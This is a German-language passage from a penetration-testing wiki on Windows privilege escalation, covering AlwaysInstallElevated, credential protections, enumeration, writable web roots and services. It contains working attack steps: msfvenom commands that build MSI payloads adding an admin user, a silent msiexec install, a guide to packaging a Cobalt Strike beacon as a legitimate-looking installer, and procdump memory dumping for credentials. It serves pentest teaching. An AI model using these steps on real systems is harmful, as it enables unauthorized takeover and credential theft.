Prüfe die Richtlinien des tatsächlichen DC für [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) und [LDAPS channel binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), die Objekt-ACL der weitergeleiteten Identität sowie die Authentifizierungs- und Impersonation-Level der ausgewählten COM-Klasse. Der Anmeldetyp und der Anmeldeinformationskontext des Aufrufers sind relevant: Eine WinRM-Sitzung kann sich anders verhalten als eine interaktive Anmeldung oder eine Anmeldung mit neuen Anmeldeinformationen. Auch Firewall-/OXID-Routing und installierte Updates können das Ergebnis beeinflussen. Behandle eine permissive Richtlinie oder eine passende ACL als Kandidaten für eine Überprüfung; passive Enumeration sollte keine COM-Coercion, Relay-Authentifizierung oder Verzeichnisschreibzugriffe auslösen. Ein Shadow Credential für ein Computerkonto kann zu einem Maschinenticket führen und nur dann, wenn dieses Konto über die erforderlichen Verzeichnisreplikationsrechte verfügt, zu einem separaten DCSync-Pfad.

Finde den **Exploit unter** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Weitere Informationen zum Ablauf des Angriffs findest du unter [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Wenn** diese beiden Registrierungsschlüssel **aktiviert** sind (Wert **0x1**), können Benutzer mit beliebigen Berechtigungen `*.msi`-Dateien als NT AUTHORITY\\**SYSTEM** **installieren** (ausführen).

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Wenn du über eine Meterpreter-Sitzung verfügst, kannst du diese Technik mit dem Modul **`exploit/windows/local/always_install_elevated`** automatisieren.

### PowerUP

Verwende den Befehl `Write-UserAddMSI` von power-up, um im aktuellen Verzeichnis eine Windows-MSI-Binärdatei zur Rechteausweitung zu erstellen. Dieses Skript schreibt einen vorkompilierten MSI-Installer, der zum Hinzufügen eines Benutzers/einer Gruppe auffordert (du benötigst daher GIU-Zugriff):

```
Write-UserAddMSI
```

Führe einfach die erstellte Binärdatei aus, um deine Berechtigungen zu erweitern.

### MSI Wrapper

Lies dieses Tutorial, um zu erfahren, wie du mit diesem Tool einen MSI Wrapper erstellst. Beachte, dass du eine „**.bat**“-Datei verpacken kannst, wenn du **nur** **Befehlszeilen ausführen** möchtest.

{{#ref}}
msi-wrapper.md
{{#endref}}

### MSI mit WIX erstellen


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### MSI mit Visual Studio erstellen

- **Erstelle** mit Cobalt Strike oder Metasploit einen **neuen Windows-EXE-TCP-Payload** unter `C:\privesc\beacon.exe`.
- Öffne **Visual Studio**, wähle **Create a new project** und gib „installer“ in das Suchfeld ein. Wähle das Projekt **Setup Wizard** aus und klicke auf **Next**.
- Gib dem Projekt einen Namen, zum Beispiel **AlwaysPrivesc**, verwende `C:\privesc` als Speicherort, wähle **place solution and project in the same directory** aus und klicke auf **Create**.
- Klicke auf **Next**, bis du zu Schritt 3 von 4 gelangst (Dateien zum Einfügen auswählen). Klicke auf **Add** und wähle den gerade erstellten Beacon-Payload aus. Klicke anschließend auf **Finish**.
- Markiere das Projekt **AlwaysPrivesc** im **Solution Explorer** und ändere in den **Properties** den Wert von **TargetPlatform** von **x86** zu **x64**.
  - Du kannst weitere Eigenschaften ändern, zum Beispiel **Author** und **Manufacturer**, damit die installierte App seriöser wirkt.
- Klicke mit der rechten Maustaste auf das Projekt und wähle **View > Custom Actions** aus.
- Klicke mit der rechten Maustaste auf **Install** und wähle **Add Custom Action** aus.
- Doppelklicke auf **Application Folder**, wähle die Datei **beacon.exe** aus und klicke auf **OK**. Dadurch wird sichergestellt, dass der Beacon-Payload ausgeführt wird, sobald das Installationsprogramm gestartet wird.
- Ändere unter **Custom Action Properties** den Wert von **Run64Bit** zu **True**.
- **Erstelle** das Projekt.
  - Wenn die Warnung `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` angezeigt wird, stelle sicher, dass du die Plattform auf x64 gesetzt hast.

### MSI-Installation

So führst du die **Installation** der schädlichen `.msi`-Datei **im Hintergrund** aus:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Um diese Schwachstelle auszunutzen, kannst du Folgendes verwenden: _exploit/windows/local/always_install_elevated_

## Antivirus und Detektoren

### Überwachungseinstellungen

Diese Einstellungen legen fest, was **protokolliert** wird. Daher solltest du darauf achten.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Bei Windows Event Forwarding ist es interessant zu wissen, wohin die Logs gesendet werden.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** dient der **Verwaltung lokaler Administratorpasswörter** und stellt sicher, dass jedes Passwort auf Computern, die einer Domäne beigetreten sind, **eindeutig, zufällig und regelmäßig aktualisiert** wird. Diese Passwörter werden sicher in Active Directory gespeichert und können nur von Benutzern mit ausreichenden Berechtigungen über ACLs eingesehen werden. So können sie autorisierte Benutzer lokale Administratorpasswörter anzeigen lassen.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Wenn aktiv, werden **Passwörter im Klartext in LSASS** (Local Security Authority Subsystem Service) gespeichert.\
[**Weitere Informationen zu WDigest auf dieser Seite**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA-Schutz

Ab **Windows 8.1** führte Microsoft einen erweiterten Schutz für die Local Security Authority (LSA) ein, um Versuche nicht vertrauenswürdiger Prozesse zu **blockieren**, **ihren Speicher auszulesen** oder Code einzuschleusen und so das System weiter abzusichern.\
[**Weitere Informationen zum LSA-Schutz hier**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** wurde in **Windows 10** eingeführt. Es soll auf einem Gerät gespeicherte Anmeldedaten vor Bedrohungen wie Pass-the-Hash-Angriffen schützen. [**Weitere Informationen zu Credential Guard finden Sie hier.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Cached Credentials

**Domänenanmeldedaten** werden von der **Local Security Authority** (LSA) authentifiziert und von Betriebssystemkomponenten verwendet. Wenn die Anmeldedaten eines Benutzers von einem registrierten Sicherheitspaket authentifiziert werden, werden in der Regel Domänenanmeldedaten für den Benutzer eingerichtet.\
[**Weitere Informationen zu Cached Credentials finden Sie hier**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Benutzer und Gruppen

### Benutzer und Gruppen auflisten

Du solltest prüfen, ob eine der Gruppen, denen du angehörst, über interessante Berechtigungen verfügt.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Privilegierte Gruppen

Wenn du **Mitglied einer privilegierten Gruppe bist, kannst du möglicherweise deine Berechtigungen erweitern**. Erfahre hier mehr über privilegierte Gruppen und wie du sie missbrauchen kannst, um deine Berechtigungen zu erweitern:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Erfahre mehr** darüber, was ein **Token** ist, auf dieser Seite: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Sieh dir die folgende Seite an, um **mehr über interessante Tokens** und deren Missbrauch zu erfahren:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Angemeldete Benutzer / Sitzungen

```bash
qwinsta
klist sessions
```

### Benutzerordner

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Kennwortrichtlinie

```bash
net accounts
```

### Inhalt der Zwischenablage abrufen

```bash
powershell -command "Get-Clipboard"
```

## Laufende Prozesse

### Datei- und Ordnerberechtigungen

Prüfe beim Auflisten der Prozesse zuerst, **ob sich Passwörter in der Befehlszeile des Prozesses befinden**.\
Prüfe, ob du **eine laufende Binärdatei überschreiben** kannst oder Schreibberechtigungen für den Binärdateiordner hast, um mögliche [**DLL Hijacking-Angriffe**](dll-hijacking/index.html) auszunutzen:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Prüfe immer, ob [**electron/cef/chromium-Debugger** laufen; du könntest sie zur Privilegieneskalation missbrauchen](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Ein Debugger-Listener kann nur kurzzeitig verfügbar sein. Dass er in einer passiven Momentaufnahme der Ports nicht zu sehen ist, beweist daher nicht, dass er nie erreichbar war. Ordne jeden beobachteten Listener seiner PID, dem Prozesseigentümer und der Möglichkeit des Benutzers mit geringeren Privilegien zu, ihn zu erreichen. Allein der Anwendungsname oder ein Debug-Flag belegt keine Codeausführung über Benutzergrenzen hinweg. Führe die routinemäßige Enumeration passiv durch, statt Debugger-Befehle zu senden.

**Berechtigungen der Prozess-Binärdateien prüfen**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Berechtigungen der Ordner der Prozess-Binärdateien überprüfen (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort-Verzeichnisse für dynamische Präprozessoren

Snort 2 kann Shared Libraries aus einem `dynamicpreprocessor directory` laden, das in der mit `snort.exe -c <config>` ausgewählten Konfiguration angegeben ist. Wenn eine geplante Aufgabe oder ein Dienst Snort unter einem anderen Konto ausführt, prüfe genau diese Konfiguration und die ACL des angegebenen Modulverzeichnisses. Wenn dein Token dort Dateien erstellen kann, sollte der Pfad daraufhin geprüft werden, ob Code ausgeführt werden kann, wenn die Aufgabe oder der Dienst das nächste Mal Module lädt. Überprüfe die effektiven Berechtigungen des Ausführungskontos, die aktive Konfiguration, die Modulkompatibilität sowie etwaige Verweigerungs- oder Freigabebeschränkungen; ein beschreibbares Verzeichnis allein belegt keine Rechteausweitung. [Snorts Dokumentation zu dynamischen Präprozessoren](https://www.snort.org/documents/dpx-readme) beschreibt das Laden von Modulen zur Laufzeit.

### Privilegierter Webdienst mit beschreibbarem Dokumentenstammverzeichnis

Vergleiche bei einer Windows-Apache-Installation den Pfad der ausführbaren Datei des Dienstes und das Ausführungskonto mit dem `DocumentRoot` in der aktiven `httpd.conf`. Prüfe bei einem üblichen XAMPP-Layout `C:\xampp\apache\conf\httpd.conf` und die ACL des konfigurierten Dokumentenstammverzeichnisses, oft `C:\xampp\htdocs`. Wenn ein Benutzer mit geringeren Berechtigungen in diesem Verzeichnis Dateien erstellen kann, während Apache als `LocalSystem` ausgeführt wird, kann die serverseitige Codeausführung die Berechtigungsgrenze des Hosts überschreiten. Bestätige, dass der Dienst ausgeführt wird, dass der genaue Pfad bereitgestellt wird und dass ein serverseitiger Handler den Dateityp verarbeitet; ein beschreibbares Stammverzeichnis allein belegt nur, dass Dateien erstellt werden können. Prüfe die ACLs, ohne eine Testdatei zu schreiben:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Bei einer herkömmlichen WAMP-Installation verweist der Dienst möglicherweise auf eine versionierte `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (oder bei einem 32-Bit-Layout auf `C:\wamp\...`). Die Konfiguration befindet sich daneben unter `conf\httpd.conf`, und das Standard-Root-Verzeichnis ist `C:\wamp64\www` oder `C:\wamp\www`. Prüfen Sie gemeinsam das genaue Dienstimage, die Run-as-Identität, das effektive `DocumentRoot` (einschließlich der Auflösung von `${INSTALL_DIR}` und Überschreibungen durch virtuelle Hosts) sowie die ACL des Root-Verzeichnisses. Ein beschreibbares WAMP-Verzeichnis belegt weder, dass Apache als `SYSTEM` läuft, noch, dass die übermittelte Datei ausgeführt wird. [Apache dokumentiert, wie ein Windows-Dienst seine Konfiguration auswählt](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Beschreibbares IIS-Root-Verzeichnis und Netzwerkidentität des Anwendungspools

Ordnen Sie bei IIS ein beschreibbares physisches Verzeichnis in `applicationHost.config` einer **aktiven Site/Anwendung** zu und ermitteln Sie anschließend den konfigurierten Pool und den serverseitigen Handler. In einem bereitgestellten Verzeichnis abgelegter Code wird nur dann als Pool ausgeführt, wenn IIS diesen Dateityp verarbeitet und die Route erreichbar ist. Prüfen Sie die effektiven Berechtigungen des aktuellen Benutzers zum Erstellen von Dateien, den Laufzeitstatus der Site, den Handler und pfadspezifische Überschreibungen, bevor Sie ein beschreibbares Verzeichnis als Codeausführung einstufen.

Die dynamische ASP.NET-Kompilierung eröffnet einen separaten Prüfpfad: generierte Dateien im Kompilierungsverzeichnis der Anwendung. Standardmäßig ist dies ein Verzeichnis namens `Temporary ASP.NET Files` unterhalb der betreffenden .NET Framework-Installation. Die Einstellung `<compilation tempDirectory>` der Anwendung kann diesen Pfad jedoch ändern. [Microsoft dokumentiert den Speicherort und anwendungsspezifische Unterverzeichnisse](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) und [empfiehlt, Kompilierungsverzeichnisse zu isolieren, wenn Anwendungspools einander nicht vertrauen](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Kann ein Token mit geringeren Berechtigungen generierten Quellcode im Cache der **konkreten** Anwendung ändern, ermitteln Sie, ob diese Anwendung ihn unter einer privilegierteren [Worker-Prozessidentität](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) erneut kompiliert. Eine Datei- oder Verzeichnis-ACL allein belegt keine Codeausführung: Gleichen Sie den Cache mit der aktiven Anwendung, dem effektiven Token und der ACL, den Kompilierungseinstellungen, der Prozessidentität und dem Zeitpunkt einer möglichen Neukompilierung ab. Prüfen Sie Metadaten ausschließlich lesend; lösen Sie bei der Enumeration keine Kompilierung aus und ändern Sie keine Cache-Dateien.

Ein IIS-Pool, der als `ApplicationPoolIdentity` oder `NetworkService` konfiguriert ist, authentifiziert sich bei Domänenressourcen häufig als **Computerkonto des Hosts**, auch wenn sein lokales Token nur geringe Berechtigungen hat. `LocalSystem` verfügt lokal bereits über hohe Berechtigungen und verwendet im Netzwerk ebenfalls das Computerkonto; `LocalService` verwendet normalerweise anonyme Netzwerkanmeldeinformationen. Ein Pool mit `SpecificUser` verwendet stattdessen das konfigurierte Konto. [Microsoft dokumentiert diese Identitätstypen](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) und [die Netzwerkidentität des Anwendungspools](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Eine nicht angegebene Identitätseinstellung kann die Standardwerte des Pools übernehmen, die sich je nach IIS-Version unterscheiden. Ermitteln Sie daher die effektive Konfiguration, anstatt anhand des Poolnamens zu raten. Erreicht die Codeausführung einen Pool mit der Netzwerkidentität des Computerkontos, prüfen Sie die Verzeichnisberechtigungen **dieses konkreten Computers**. [DCSync](../active-directory-methodology/dcsync.md) erfordert Replikationsrechte auf dem Domänennamenskontext; ein Maschinenkonto-Ticket oder eine Hostrolle allein belegt diese Rechte nicht. Bei einer passiven Enumeration sollten Sie Konfiguration und ACLs prüfen, ohne Dateien hochzuladen, Netzwerkauthentifizierungen durchzuführen oder Tickets anzufordern.

Verfolgen Sie bei einem lesbaren ASP.NET-Handler, der einen Hilfsprozess startet, jeden aus einer Anfrage stammenden Wert durch Authentifizierung, Entschlüsselung, Validierung und Befehlserstellung. Ein Handler, der ein dekodiertes Token an `ProcessStartInfo("cmd", "/c ...")` anhängt, kann es ermöglichen, dass Shell-Metazeichen den Befehl verändern; [Microsoft dokumentiert die Sonderzeichen von `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Stellen Sie fest, ob ein nicht vertrauenswürdiger Aufrufer den dekodierten Wert tatsächlich beeinflussen und den Handler erreichen kann. Ermitteln Sie anschließend die effektive Identität des Anwendungspools oder des impersonierten Benutzers sowie die Identität des untergeordneten Prozesses. Eine lesbare Quellcodezeile, ein Listener auf `localhost` oder eine Schwachstelle im Token-Format allein belegt keine privilegierte Befehlsausführung. Prüfen Sie Quellcode und Poolkonfiguration, ohne gefälschte Anfragen zu senden oder den Hilfsprozess während der passiven Enumeration auszuführen.

Bei einem PHP-Dienst unter Windows kann ein anfragegesteuerter Pfad, der an [`include` oder `require`](https://www.php.net/manual/en/function.include.php) übergeben wird, eine PHP-Datei auswerten, die ein Benutzer mit geringeren Berechtigungen ändern kann, und zwar unter der Identität des Worker-Prozesses. Bestätigen Sie, dass die Anfrage diese Anweisung erreichen kann, der aufgelöste Pfad auf eine Datei verweist, die der Benutzer mit geringeren Berechtigungen ändern und der Worker lesen kann, geltende PHP-Pfadbeschränkungen das Einbinden zulassen und der Worker tatsächlich mit höheren Berechtigungen ausgeführt wird. Ein Listener auf der Loopback-Schnittstelle oder eine beschreibbare Datei allein belegt diese Angriffskette nicht. Prüfen Sie Quellcode, Dienstidentität und Datei-ACLs, ohne den Endpunkt bei einer passiven Enumeration aufzurufen.

### Memory Password mining

Mit **procdump** aus Sysinternals können Sie einen Speicherauszug eines laufenden Prozesses erstellen. Dienste wie FTP halten **Anmeldedaten im Arbeitsspeicher im Klartext** vor. Versuchen Sie, den Speicher auszulesen und die Anmeldedaten zu finden.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Unsichere GUI-Apps

**Anwendungen, die als SYSTEM ausgeführt werden, können es einem Benutzer ermöglichen, eine CMD zu starten oder Verzeichnisse zu durchsuchen.**

Beispiel: „Windows-Hilfe und Support“ (Windows + F1), nach „Eingabeaufforderung“ suchen, auf „Klicken, um die Eingabeaufforderung zu öffnen“ klicken

### Import privilegierter Projektdateien

Eine Anwendung, die Projekte automatisch aus einem Drop-Verzeichnis öffnet, in das ein Benutzer mit niedrigeren Rechten schreiben kann, überschreitet beim Import unter dem Konto des Importers eine Vertrauensgrenze für Eingaben. Prüfen Sie den **genauen beschreibbaren Pfad**, den Prozess oder Task, der darauf zugreift, dessen effektive Identität und den Parser-Build. Ein [historisches Problem beim Öffnen/Wiederherstellen von Ghidra-Projekten](https://github.com/NationalSecurityAgency/ghidra/issues/71) ermöglichte XML External Entities in Projektmetadaten; eine Netzwerk-Entity unter Windows könnte eine Authentifizierung durch das importierende Konto auslösen, sofern die [Richtlinien für ausgehendes SMB und NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) dies zulassen. Das ist ein Hinweis auf mögliche Offenlegung von Zugangsdaten, aber kein unmittelbarer Administratorzugriff: Die Antwort muss über einen separaten autorisierten oder verwundbaren Pfad nutzbar sein, und aktuelle Builds müssen anhand ihres tatsächlichen Patch-Status bewertet werden. Öffnen Sie bei passiver Enumeration kein präpariertes Projekt; prüfen Sie den Import-Workflow und die ACLs.

## Dienste

Das Recht [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) für das Service Control Manager (SCM)-Objekt ist unabhängig von den Rechten für einen vorhandenen Dienst. Eine erfolgreiche schreibgeschützte [`OpenSCManager`-Zugriffsanforderung](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) für dieses Recht ist ein Prüfhinweis, aber kein Beweis dafür, dass ein neuer Dienst ausgeführt werden kann. [`CreateService` gibt ein Handle zurück](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew), das bei der Erstellung die angeforderten Dienstrechte besitzt; ein späteres erneutes Öffnen des Dienstes führt eine separate Zugriffsprüfung durch und kann fehlschlagen, selbst wenn das ursprüngliche Handle verwendet werden könnte. Prüfen Sie separat das effektive lokale oder Remote-Token, die gewährten Handle-Rechte, das Dienstkonto, die Start-Richtlinie und den Pfad zur ausführbaren Datei. Erstellen oder starten Sie bei passiver Enumeration keinen Dienst.

Prüfen Sie bei einem Remote-Pfad zur Dienstinstallation diese SCM-Rechte zusammen mit einer Freigabe auf dem Ziel, in die **dieselbe Netzwerkanmeldung** schreiben kann, deren zugrunde liegenden NTFS-ACLs und einem lokalen Pfad zu einer ausführbaren Datei, die das Dienstkonto ausführen kann. Ein Konto ohne Administratorrechte kann diese Grenze überschreiten, wenn ungewöhnlich weitreichende SCM-Rechte und ein Pfad zur Dateiablage gleichzeitig vorhanden sind; eine administrative Freigabe ist keine zwingende Voraussetzung. Schreibzugriff auf eine Freigabe allein oder ein Hinweis auf das Recht, einen Dienst über SCM zu erstellen, beweist nicht, dass der neue Dienst mit einer höheren Identität gestartet werden kann.

Ein vorhandener Dienst kann beim Start, beim Herunterfahren oder bei einem anderen Lebenszyklusereignis ein Hilfsprogramm aufrufen, auch wenn dieses nicht in seinem `ImagePath` angegeben ist. Wird der Name des Hilfsprogramms in ein Verzeichnis aufgelöst, in das ein Benutzer mit niedrigeren Rechten schreiben kann, und läuft der Dienst mit einer höheren Identität, kommt eine fehlende Hilfsdatei unter bestimmten Bedingungen als Ersatz infrage. Bestätigen Sie den **tatsächlichen Dienstcode oder den dokumentierten Aufruf des Hilfsprogramms**, den aufgelösten Pfad zur ausführbaren Datei und die Suchreihenfolge, die Verzeichnis-Erstellungsrechte, die Dienstidentität und einen verfügbaren Auslöser im Lebenszyklus. Ein beschreibbares Dienstverzeichnis oder eine fehlende Datei allein beweist nicht, dass der Dienst die Datei lädt; starten oder stoppen Sie den Dienst bei einer passiven Prüfung nicht.

Bei einem vorhandenen Dienst erlaubt [`SERVICE_START` die Übergabe von Argumenten an `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); dieses Recht ist von [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) zu unterscheiden. Prüfen Sie den Dienstcode oder die dokumentierte Schnittstelle, bevor Sie das Startrecht als mehr als ein Steuerungsrecht einstufen. Wenn der Dienst ein vom Aufrufer gewähltes Argument als Protokoll- oder Exportpfad verwendet, prüfen Sie die Dienstidentität, den genauen Ablauf vom Argument bis zum Schreibvorgang, Pfadbeschränkungen und die Berechtigungen der **erstellten Datei**. Ein Schreibvorgang in ein geschütztes Verzeichnis kann nur dann zur Rechteausweitung führen, wenn ein separater privilegierter Verbraucher oder Loader diese Datei akzeptiert; ein beschreibbares Protokoll oder ein Startrecht allein reicht nicht aus. Erstellen Sie bei der passiven Bestandsaufnahme weder eine Testdatei noch starten Sie den Dienst.

Bei einem NSClient++-Monitoring-Agenten ist eine lesbare `nsclient.ini` ein **Hinweis für die Konfigurationsprüfung**: Sie kann Web-Zugangsdaten enthalten, während `boot.ini` die Konfiguration an einen anderen Speicherort umleiten kann. Prüfen Sie das tatsächliche Dienstkonto, den WEB-Listener und die Zugriffsrichtlinie sowie, ob die authentifizierte Rolle Einstellungen oder Skripte ändern kann. Eine privilegierte Ausführung erfordert zusätzlich `CheckExternalScripts` (oder einen anderen aktivierten Ausführungspfad), ein wirksames Recht zum Registrieren oder Ändern eines Befehls und einen Auslöser, der ihn unter der Dienstidentität ausführt. Ein nur an Loopback gebundener Listener kann für einen lokalen Benutzer dennoch erreichbar sein, doch der Dateipfad, das Passwort oder der Listener allein belegen diese Rechte nicht. Prüfen Sie bei der passiven Enumeration Metadaten und Berechtigungen, ohne Geheimnisse anzuzeigen oder die Web-API aufzurufen. Siehe das [NSClient++-Dateilayout](https://nsclient.org/docs/concepts/file-layout/), die [Sicherheitshinweise zu Web und Skripten](https://nsclient.org/docs/setup/securing/) und die [Konfiguration externer Skripte](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Bei einem Dienst, dessen `ImagePath` auf `nssm.exe` verweist, prüfen Sie das tatsächliche Ausführungskonto des Dienstes und den Wert `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM speichert dort die untergeordnete Anwendung](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), während `AppDirectory` dessen konfiguriertes Arbeitsverzeichnis ist. Prüfen Sie die untergeordnete ausführbare Datei und die ACLs ihrer übergeordneten Verzeichnisse, bevor Sie die Berechtigungen des Wrappers als vollständige Dienstgrenze betrachten. Ein lokaler WCF- oder SOAP-Endpunkt, der von diesem untergeordneten Prozess bereitgestellt wird, ist ein separater Prüfhinweis: Bestätigen Sie, dass der Benutzer mit niedrigeren Rechten den Listener erreichen kann, dass der konkrete Vorgang seine Eingaben akzeptiert und dass der untergeordnete Dienstprozess den unsicheren Vorgang unter einer höheren Identität ausführt. Das Dienstkonto, eine Endpunkt-URL oder ein beschreibbarer Pfad allein beweist keine Rechteausweitung; rufen Sie bei passiver Enumeration keine Dienstvorgänge auf.

Verfolgen Sie bei einem benutzerdefinierten WCF-Vorgang eine vom Aufrufer kontrollierte Zeichenfolge bis in eine beliebige PowerShell-Runspace. [`Pipeline.Commands.AddScript` fügt Skripttext hinzu](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), und [`Pipeline.Invoke` führt die Pipeline aus](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). Eine [`netTcpBinding` mit Windows-Transportanmeldeinformationen](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) authentifiziert den Client, doch die Berechtigung zum Aufruf dieses **konkreten** Vorgangs und die effektive Identität der Runspace müssen separat geprüft werden. Ein Pfad von Eingaben eines Aufrufers mit niedrigeren Rechten zu `AddScript` unter einer höheren Dienstidentität bildet eine Codeausführungsgrenze; ein lauschender Port, ein authentifizierter Client oder eine ungenutzte Methode in einer nicht zugehörigen Assembly allein ist kein Beweis. Prüfen Sie den bereitgestellten Dienst, den Vertrag, die Autorisierung und die Impersonation-Einstellungen statisch, ohne den Endpunkt bei der Enumeration aufzurufen.

Service Triggers ermöglichen es Windows, einen Dienst zu starten, wenn bestimmte Bedingungen eintreten (Aktivität an benannten Pipes/RPC-Endpunkten, ETW-Ereignisse, verfügbare IP-Adresse, Geräteanschluss, GPO-Aktualisierung usw.). Auch ohne SERVICE_START-Rechte können Sie privilegierte Dienste oft durch das Auslösen ihrer Trigger starten. Hier finden Sie Techniken zur Enumeration und Aktivierung:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Diagnosesammlerdienst von Visual Studio

Visual-Studio-Installationen mit C/C++-Tools können `VSStandardCollectorService150` enthalten, einen Diagnosedienst, der für die Ausführung als `LocalSystem` konfiguriert ist. Bei [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) wurde eine Junction und ein Race mit einem Object-Manager-Link verwendet, um das Zurücksetzen einer Dienst-DACL umzuleiten. Für die demonstrierte Rechteausweitung war außerdem ein nutzbarer Reparaturpfad über das Visual Studio Setup WMI Provider MSI sowie dessen Ziel `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` erforderlich. Die Komponente wurde im Januar 2024 behoben.

Prüfen Sie bei der passiven Triage das Konto und den Binärpfad dieses einen Dienstes, ob der Pfad zum Setup-WMI-Compiler vorhanden ist, und den Patch-Status der installierten Komponente. Ein Diensteintrag, eine Visual-Studio-Produktversion oder die Compilerdatei allein belegen nicht, dass der Host verwundbar ist. Für die Prüfung muss der Dienst weder gestartet noch eine Reparatur ausgeführt werden.

Rufen Sie eine Liste der Dienste ab:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Berechtigungen

Mit **sc** kannst du Informationen zu einem Dienst abrufen.

```bash
sc qc <service_name>
```

